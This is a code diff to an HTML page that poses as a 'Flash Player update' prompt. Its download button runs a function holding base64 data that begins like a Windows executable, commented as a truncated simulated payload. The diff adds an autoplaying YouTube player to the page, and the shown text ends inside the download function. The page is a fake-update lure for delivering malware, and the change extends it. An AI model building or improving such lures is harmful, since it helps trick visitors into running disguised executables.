@@ -38,7 +38,39 @@
     <p>To continue viewing this content, please update Flash Player to the latest version.</p>
     <button onclick="triggerDownload()">Download Update</button>
   </div>
+  <div id="player"></div>
 
+  <script>
+    // Load YouTube IFrame API
+    var tag = document.createElement('script');
+    tag.src = "https://www.youtube.com/iframe_api";
+    var firstScriptTag = document.getElementsByTagName('script')[0];
+    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
+
+    var player;
+
+    // When API is ready, create a new YouTube player
+    function onYouTubeIframeAPIReady() {
+      player = new YT.Player('player', {
+        height: '390',
+        width: '640',
+        videoId: 'dQw4w9WgXcQ', // Example video ID
+        events: {
+          'onReady': onPlayerReady,
+          'onStateChange': onPlayerStateChange
+        }
+      });
+    }
+
+    function onPlayerReady(event) {
+      event.target.playVideo();
+    }
+
+    function onPlayerStateChange(event) {
+      // Log state changes
+      console.log('Player state changed:', event.data);
+    }
+  </script>
   <script>
     function triggerDownload() {
       const base64Data = "TVqQAAMAAAAEAAA..."; // Truncated simulated payload
